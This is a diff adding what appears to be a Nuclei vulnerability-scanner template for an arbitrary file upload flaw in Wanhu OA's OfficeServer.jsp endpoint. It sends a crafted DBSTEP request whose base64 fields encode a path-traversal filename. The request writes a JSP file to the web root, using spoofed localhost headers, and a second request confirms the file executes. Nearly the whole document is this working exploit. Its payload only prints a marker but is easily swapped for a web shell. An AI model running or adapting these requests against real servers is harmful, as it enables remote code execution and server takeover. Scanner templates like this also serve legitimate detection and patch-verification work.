@@ -1,0 +1,47 @@
+id: wanhuOA_OfficeServer_upload
+
+info:
+  name: wanhuOA_OfficeServer.jsp_upload
+  author: sm
+  severity: critical
+  tags: wanhuOA
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/public/iWebOfficeSign/OfficeServer.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+        Cookie: OASESSIONID=847AE3A2E5D155AE7FB1CD2C6736CD66
+        x-forwarded-for: 127.0.0.1
+        x-originating-ip: 127.0.0.1
+        x-remote-ip: 127.0.0.1
+        x-remote-addr: 127.0.0.1
+        Connection: close
+        Content-Length: 254
+
+        DBSTEP V3.0     170      01000      DBSTEP=REJTVEVQ
+        OPTION=U0FWRUZJTEU=
+        RECORDID=
+        isDoc=dHJ1ZQ==
+        moduleType=Z292ZG9jdW1lbnQ=
+        FILETYPE=Li4vLi4vcHVibGljL2VkaXQvMHhvbGQuanNw
+        111111111111111111111111111111111111111111111111
+        <% out.println("0xold6");%>
+        
+      - |
+        GET /defaultroot/public/edit/0xold.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+
+    matchers:
+      - type: word
+        words:
+          - "0xold6"
+        part: body
